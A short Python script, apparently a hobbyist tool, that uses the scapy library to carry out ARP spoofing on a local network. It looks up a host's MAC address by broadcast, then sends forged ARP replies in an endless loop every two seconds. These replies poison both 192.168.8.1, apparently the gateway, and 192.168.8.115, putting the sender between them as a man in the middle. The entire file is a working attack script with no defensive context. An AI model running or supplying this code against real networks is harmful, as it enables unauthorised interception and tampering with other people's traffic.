#!/usr/bin/env python
from time import sleep

import scapy.all as scapy
def scanMac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    req_broadcast=broadcast/arp_req
    ans = scapy.srp(req_broadcast, timeout=1,verbose=False)[0]
    return ans[0][1].hwsrc
def spoof(target,spoofer):
    target_mac= scanMac(target)
    packet = scapy.ARP(op=2,pdst=target,hwdst=target_mac,psrc=spoofer)
    scapy.send(packet)
while True:
    spoof('192.168.8.1','192.168.8.115')
    spoof('192.168.8.115', '192.168.8.1')
    sleep(2)